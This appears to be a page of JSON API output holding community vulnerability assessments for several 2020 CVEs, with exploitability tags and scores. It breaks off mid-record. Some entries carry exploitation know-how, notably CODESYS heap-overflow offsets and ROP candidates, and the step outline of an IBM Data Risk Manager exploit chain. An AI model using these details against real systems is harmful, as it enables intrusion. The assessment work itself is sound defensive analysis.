{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=6&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=4&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=5&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "dd3becdc-cd07-4eab-afba-17e9606ce9ae",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "c964b102-c1a8-42e7-ae93-2d5fcbad769c",
      "created": "2020-05-04T07:36:16.681859Z",
      "revisionDate": "2020-05-05T12:07:16.142219Z",
      "document": "I had been waiting for more details on this, and F-Secure delivered. I have little to add to the other excellent assessments, but from a cursory review of the advisory and the code, this looks very easy to reproduce and is already being exploited in the wild as a result.",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "16a4ff5e-4edf-40ea-8145-16df2e9572bb",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "c964b102-c1a8-42e7-ae93-2d5fcbad769c",
      "created": "2020-05-04T10:40:15.092883Z",
      "revisionDate": "2020-05-06T19:07:55.478792Z",
      "document": "Nothing to add to the technical analysis by the others. \r\n\r\nDropping by to note that:\r\n\r\n- DigiCert's CT Log 2's key used to sign SCTs was compromised 2020-05-03 \u2014 https://groups.google.com/a/chromium.org/forum/#!topic/ct-policy/aKNbZuJzwfM (wayback doesn't seem to be able to handle ggroups links, so no archive link). \r\n- Ghost was impacted on 2020-05-03 https://status.ghost.org/incidents/tpn078sqk973 / https://web.archive.org/web/20200504011743/https://status.ghost.org/incidents/tpn078sqk973\r\n- Lineage OS was impacted on 2020-05-03 https://status.lineageos.org/issues/5eae596b4a0ebd114676545f / https://web.archive.org/web/20200504114159/https://status.lineageos.org/issues/5eae596b4a0ebd114676545f\r\n\r\n- we've been seeing twice 1-2 monthly, low-grade inventory scans for hosts exposing port 4506 through March 2020 but have registered a notable increase (usually <10, now 50+) in unique sources since the vulnerability was disclosed. Looks like ~30% of those are known benign scanners doing new cataloging.",
      "score": 5,
      "metadata": {
        "tags": [
          "common_enterprise",
          "easy_to_develop",
          "pre_auth",
          "default_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3e749725-9740-446a-880d-072338a34bdc",
      "editorId": "7dcb2bba-0893-4a4b-a2c9-152965f852b9",
      "topicId": "eb6db072-461b-4082-bd38-d5c876057e93",
      "created": "2020-05-06T20:42:55.86009Z",
      "revisionDate": "2020-05-06T22:10:35.111963Z",
      "document": "Here's a few of links:\r\n\r\nhttps://twitter.com/j00ru/status/1258066559765004295\r\nhttps://bugs.chromium.org/p/project-zero/issues/detail?id=2002\r\nhttps://security.samsungmobile.com/securityUpdate.smsb\r\n\r\nSamsung devices are among the most popular Android platforms out there. They last a long, long time, and often quietly go EOL / end of support, and keep on trucking for years. So, for many millions of targets, this is effectively forever-day.\r\n\r\nOne downside for attackers is that it does seem to require a fair bit of time to exploit -- the video demo shows exploitation taking about an hour and a half or so, and it leaves a few hundred unread MMS messages in the queue. This time cost and the attendant lack of stealth means that attacks need to happen specifically when the user isn't active on the phone -- kind of the opposite of \"requires user interaction,\" but close enough for the ding on scoring, above.\r\n\r\nMaybe a middle-of-the-night attack, with a follow-up cleanup, would be enough to avoid detection, but you might need to chain another exploit for a privilege escalation to get you write/delete access to the message queue -- the attacker assumes the privileges of Samsung Messages, which is pretty good, but it's not root,",
      "score": 2,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "common_enterprise",
          "easy_to_develop",
          "requires_interaction",
          "default_configuration",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "d3200fa9-82c6-4ccf-a465-b802b3219f33",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "eb6db072-461b-4082-bd38-d5c876057e93",
      "created": "2020-05-07T20:14:59.035572Z",
      "revisionDate": "2020-07-22T22:58:07.795508Z",
      "document": "This CVE collectively describes 5218 unique crashes that were reported to Samsung by a Google Project Zero researcher. The crashes occur within the Skia library and are related to the processing of Qmage images. The Qmage image format was developed by a third-party company but was added to the Skia Android library on Samsung phones. These bugs can be triggered remotely and without interaction by sending MMS messages to the target device.\r\n\r\nThe vulnerability does not affect all Android devices, only those with the modified Skia library distributed by Samsung on their phones. It's likely that other exploit delivery scenarios are viable but may require user interaction to trigger rendering the image.\r\n\r\nSuccessful exploitation requires bypassing ASLR which reportedly can be achieved remotely by sending multiple messages to the target. Further details on this aspect of the exploit are not currently public and contribute to the complexity of weaponizing a PoC for this vulnerability. Successfully exploiting the vulnerability yields code execution within the context of the exploited process. In the case of the messenger application, this could be used to leak text messages.",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "04cfb0c3-d903-453f-99f9-f138dad67d48",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "685efacc-d099-47a9-b2ad-cef372395178",
      "created": "2020-05-07T21:03:45.926482Z",
      "revisionDate": "2020-06-10T21:05:29.341062Z",
      "document": "The following analysis is based on CODESYS 3.5.15.20:\r\n\r\n* Installer file: `CODESYS 3.5.15.20.exe`, SHA-1 `b26884d2a4ded94e80d49eaaef863250fcf4684e`\r\n* Library file: `CmpWebServerHandlerV3.dll`, SHA-1 `a04f572029b22defdf4f92e72d93d1017b8d9211`\r\n\r\nCODESYS v3 Web Server is vulnerable to a heap-based buffer overflow which can be triggered by an unauthenticated attacker with a specially crafted HTTP request. The vulnerability is due to an integer overflow. This can be used by an attacker to overwrite the heap buffer directly following the under-sized allocation. The web server is only present when a web-based visualization has been configured by the operator.\r\n\r\nThe vulnerable overwrite occurs in a call to `CMUtlSafeMemCpy` from `CmpWebServerHandlerV3+3a16`. This can be used to corrupt the following heap structure, however a crash occurs 2 stack frames up form this within the same request at`CmpWebServerHandlerV3+14ac`. This is due to a call to `memcpy` use the original size field without the overflow operation applied to it. Due to the nature of integer overflow, this value is very high, typically `0xffffffff` (though any value -92 / 0xffffffa4 through -1 / 0xffffff could be used to trigger the overflow.\r\n\r\nThere are two branches that could be taken to avoid this condition for reliable code execution:\r\n* `CmpWebServerHandlerV3+146e` -- This branch is based on the return value from the previous function call and is boiled up from the overwrite operation. This branch can not be used while still trigger the overwrite.\r\n* `CmpWebServerHandlerV3+1498` -- This branch could potentialy be used if the return value from `CmpWebServer+6bc0` could be forced to be 0. This path warrants further analysis.\r\n\r\nWithout avoiding the memcpy, reliable code execution seems unlikely due to the nature of the vulnerability. Typically heap overwrites require manipulation of the heap that would not be possible if the server crashes after the overwrite while processing the HTTP request. While most modules loaded into the process have ASLR available, there are a small handful of application-specific ones that do not that could be viable candidates for use in a ROP chain.\r\n\r\nSuccessful exploitation would yield code execution within the context of the CODESYSControlServer.exe process which, in PLC development scenarios at least, runs with user privileges.",
      "score": 3,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "cc08d07a-979b-4312-900f-3c9f31926c17",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "4bb7e01a-8043-47d9-9fe7-caac3eed7c32",
      "created": "2020-05-08T04:24:40.942963Z",
      "revisionDate": "2020-07-27T15:18:33.753156Z",
      "document": "The devil (or, lack thereof) is in the details:\r\n\r\n>The attacker can view and delete files within the web services file system only. The web services file system is enabled for the WebVPN and AnyConnect >features outlined in the Vulnerable Products section of this advisory; therefore, this vulnerability does not apply to the ASA and FTD system files or underlying >operating system (OS) files. The Web Services files that the attacker can view may have information such as WebVPN configuration, bookmarks, web cookies, >partial web content, and HTTP URLs.\r\n\r\n- No RCE, but _somewhat_ sensitive (and, definitely some org-internal) data is accessible.\r\n- Reboot fixes damage.\r\n- Temporary DoS (to the web services) is in play since this vector weirdly allows delete access. \r\n- The really important system files are not accessible\r\n- Fairly trivial for an attacker to gain access to file-system layout from images or previous vulnerabilities so any intelligent use of a working PoC (when one is out) won't be super noisy but it should still be fairly easy for any capable org to monitor for abnormal HTTP interactions via device logs.\r\n\r\n",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ff54c69c-ecb9-4330-8286-b5d9654db5af",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "a1cff25f-758b-4911-86de-885afbb7a922",
      "created": "2020-05-08T15:53:36.652478Z",
      "revisionDate": "2020-05-08T16:17:15.581696Z",
      "document": "By chaining an auth bypass (this CVE), command injection ([CVE-2020-4428](https://attackerkb.com/topics/QIGYOiG1QU/cve-2020-4428)), and default password ([CVE-2020-4429](https://attackerkb.com/topics/wx29bdIATR/cve-2020-4429)), attackers can gain privileged access to [IBM Data Risk Manager](https://www.ibm.com/products/data-risk-manager) through its web API. Since this is an enterprise product that manages potentially sensitive data, compromise of the product can have significant consequences for an organization.\r\n\r\nPedro's comments in the exploit explain the multiple exploitation steps quite well:\r\n\r\n```\r\nwvu@kharak:/rapid7/metasploit-framework:master$ git grep -h 'step [1-8]' modules/exploits/linux/http/ibm_drm_rce.rb | tail -8 | sed -E 's/^[[:space:]]+//'\r\n# step 1: create a session ID and try to make it stick\r\n# step 2: give the session ID to the server and have it grant us a free admin password\r\n# step 3: login and get an authenticated cookie\r\n# step 4: obtain CSRF header in order to be able to make valid requests\r\n# step 5: upload our payload\r\n# step 6: upload our script file\r\n# step 7: we need to authenticate again to get a Bearer token (instead of the cookie we already have)\r\n# step 8 and final: invoke the nmap scan with our script file\r\nwvu@kharak:/rapid7/metasploit-framework:master$\r\n```\r\n\r\n> **step 1:** create a session ID and try to make it stick\r\n> **step 2:** give the session ID to the server and have it grant us a free admin password\r\n> **step 3:** login and get an authenticated cookie\r\n> **step 4:** obtain CSRF header in order to be able to make valid requests\r\n> **step 5:** upload our payload\r\n> **step 6:** upload our script file\r\n> **step 7:** we need to authenticate again to get a `Bearer` token (instead of the cookie we already have)\r\n> **step 8 and final:** invoke the `nmap` scan with our script file\r\n\r\nSince an auth bypass is used, this exploit isn't _technically_ unauthenticated but rather post-auth after bypassing auth. Note that these CVEs were 0days, so please patch! Great find and exploit, Pedro!",
      "score": 2,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "pre_auth",
          "easy_to_develop",
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "5315375e-a606-463f-aea0-0765aec4db05",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "99e8b330-8bd5-4184-916b-e0f5c79a259e",
      "created": "2020-05-08T16:04:34.61438Z",
      "revisionDate": "2020-05-08T16:18:47.949965Z",
      "document": "Assessment for the related CVEs here: https://attackerkb.com/assessments/ff54c69c-ecb9-4330-8286-b5d9654db5af.",
      "score": 1,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "pre_auth",
          "easy_to_develop",
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "93958bf6-051f-4c4b-8872-e9985c899c77",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "ed5275c1-2398-4282-b042-ceb71e3b4e14",
      "created": "2020-05-08T16:04:41.468236Z",
      "revisionDate": "2020-05-08T16:18:40.375965Z",
      "document": "Assessment for the related CVEs here: https://attackerkb.com/assessments/ff54c69c-ecb9-4330-8286-b5d9654db5af.",
      "score": 1,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "easy_to_develop",
          "pre_auth",
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "9dd83565-5a54-4f93-8cd8-1d574948d644",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "cd2ea331-8012-47dc-a97d-933ec7aa024a",
      "created": "2020-05-08T17:57:11.926179Z",
      "revisionDate": "2024-02-25T10:20:22.824943Z",
      "document": "This at first glance sounds a lot like Heartbleed in severity. If an attacker can leak reused buffers from the heap from an SSL firewall, there is bound to be keying material in those leaked buffers, providing very similar outcomes to heartbleed over time. The question will be what specific content can be leaked, how many times it can be run (you'll need to do this a lot to probably happen on 'interesting' buffers, but who knows?), and how quickly you can get new buffers. This covers a wide range of versions, including at least 4 unsupported versions, which means it will likely be discoverable in the wild for some time.",
      "score": 3,
      "metadata": {
        "tags": [
          "pre_auth",
          "common_enterprise"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "ac0ad161-61af-45df-a65a-383a8639ceb8",
      "editorId": "5d1fbdec-2809-4546-a4f3-adb017361060",
      "topicId": "f05ac4f4-854a-4a3b-8d2f-14902518b15e",
      "created": "2020-05-11T16:37:02.379519Z",
      "revisionDate": "2020-06-10T14:19:19.988369Z",
      "document": "The risks of [DMA attacks](https://en.wikipedia.org/wiki/DMA_attack) over PCI-Express are known for quite some time. Every PCIe device can potentially access physical memory inside a machine and exfiltrate private data like encryption keys or passwords. Modifications are also possible. As Thunderbolt has the capability to tunnel PCIe traffic, this is also possible by external Thunderbolt devices. One of the countermeasures implemented in the Thunderbolt controllers against unknown devices behaving evil is to block them entirely by employing a user configurable whitelist.\r\n\r\nThe presented vulnerabilities affect these security measures and allow to authenticate malicious devices which then can be used to perform subsequent DMA attacks. The Thunderbolt controller responsible for authenticating the devices has its own microcontroller and runs firmware from a small [SPI](https://en.wikipedia.org/wiki/Serial_Peripheral_Interface) [flash chip](https://en.wikipedia.org/wiki/Flash_memory) usually sitting next to it on the circuit board. The whitelist is stored on this SPI flash chip as well.\r\n\r\nIf the attacker has physical access to a machine, he can disassemble it, locate the flash chip and read or write it using an external device to tamper with the firmware or the whitelist stored on this device.\r\n\r\nAfter managing to authenticate a malicious thunderbolt device, it is possible to access the main physical memory of the machine using DMA transfers over PCIe. This issue is known for some time and there are other countermeasures in place to prevent malicious DMA accesses. To restrict devices on a PCIe bus from accessing whatever memory they want, the system firmware or operating system can configure the IOMMU to restrict what memory regions can be accessed or not. This is the responsibility of the software running on the system which currently only mac OS seems to perform by default. Also as an IOMMU is a piece of hardware, it needs to be supported by the platform.\r\n\r\nPossible mitigations against the attacks:\r\n- Don't let anybody disassemble your machine\r\n- Disable the Thunderbolt controller completely in the BIOS - this means disabling the PCIe device, not only setting the security level to passthrough as this setting can be bypassed using the attack\r\n- Only attach trusted devices to your machine\r\n- Consult the documentation of your hardware and operating system how to configure the IOMMU correctly to prevent malicious DMA memory accesses",
      "score": 13,
      "metadata": {
        "tags": [
          "difficult_to_exploit",
          "default_configuration",
          "high_privilege_access",
          "difficult_to_develop",
          "difficult_to_patch"
        ],
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "39849b55-c59f-4615-b869-63857cc0e55a",
      "editorId": "6a273e5b-d3c3-4e07-aaf0-280eec426e37",
      "topicId": "f05ac4f4-854a-4a3b-8d2f-14902518b15e",
      "created": "2020-05-12T13:51:21.817274Z",
      "revisionDate": "2020-05-13T15:56:20.660253Z",
      "document": "While the probability of this exploit is low this does highlight the importance of physical security.\r\n\r\nYour average attacker will not find this useful, however if your threat model includes nation states and you happen to travel a lot - take note.",
      "score": 3,
      "metadata": {
        "tags": [
          "difficult_to_exploit",
          "high_privilege_access",
          "difficult_to_patch",
          "difficult_to_develop",
          "default_configuration"
        ],
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "98a2d606-8da6-44c2-9c57-769a331e59c8",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "c0bd1d9d-a70c-4932-96c2-8de83ca489e6",
      "created": "2020-05-12T19:42:57.556124Z",
      "revisionDate": "2020-05-12T19:42:57.557727Z",
      "document": "This CVE made it into US-CERT's \"Top 10\" bulletin released in May, 2020 - https://www.us-cert.gov/ncas/alerts/aa20-133a / https://web.archive.org/web/20200512161248/https://www.us-cert.gov/ncas/alerts/aa20-133a\r\n\r\n- Vulnerable Products: Microsoft Office 2007 SP3/2010 SP2/2013 SP1/2016 Products\r\n- Associated Malware: Loki, FormBook, Pony/FAREIT\r\n- Mitigation: Update affected Microsoft products with the latest security patches\r\n- More Detail: https://nvd.nist.gov/vuln/detail/CVE-2017-11882\r\n- IOCs: https://www.us-cert.gov/ncas/analysis-reports/ar20-133e",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "83fe301f-00d7-469a-b661-fef569eca7fe",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "f48caeee-e809-405d-b7ad-48d94140c67d",
      "created": "2020-05-12T19:44:39.103295Z",
      "revisionDate": "2020-05-12T19:44:39.10495Z",
      "document": "This CVE made it into US-CERT\u2019s \u201cTop 10\u201d bulletin released in May, 2020 \u2013 https://www.us-cert.gov/ncas/alerts/aa20-133a / https://web.archive.org/web/20200512161248/https://www.us-cert.gov/ncas/alerts/aa20-133a\r\n\r\n- Vulnerable Products: Microsoft Office 2007 SP3/2010 SP2/2013 SP1/2016, Vista SP2, Server 2008 SP2, Windows 7 SP1, Windows 8.1\r\n- Associated Malware: FINSPY, LATENTBOT, Dridex\r\n- Mitigation: Update affected Microsoft products with the latest security patches\r\n- More Detail: https://nvd.nist.gov/vuln/detail/CVE-2017-0199\r\n- IOCs: https://www.us-cert.gov/ncas/analysis-reports/ar20-133g, https://www.us-cert.gov/ncas/analysis-reports/ar20-133h, https://www.us-cert.gov/ncas/analysis-reports/ar20-133p",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2b99f4eb-7a3a-4619-8a74-bc1b9a13bee5",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "bdf59c15-d64f-45d5-b1ac-d1b9dd354080",
      "created": "2020-05-12T19:45:39.504479Z",
      "revisionDate": "2020-05-12T19:45:39.504046Z",
      "document": "This CVE made it into US-CERT\u2019s \u201cTop 10\u201d bulletin released in May, 2020 \u2013 https://www.us-cert.gov/ncas/alerts/aa20-133a / https://web.archive.org/web/20200512161248/https://www.us-cert.gov/ncas/alerts/aa20-133a\r\n\r\n- Vulnerable Products: Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1\r\n- Associated Malware: JexBoss\r\n- Mitigation: Upgrade to Struts 2.3.32 or Struts 2.5.10.1\r\n",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "common_enterprise"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
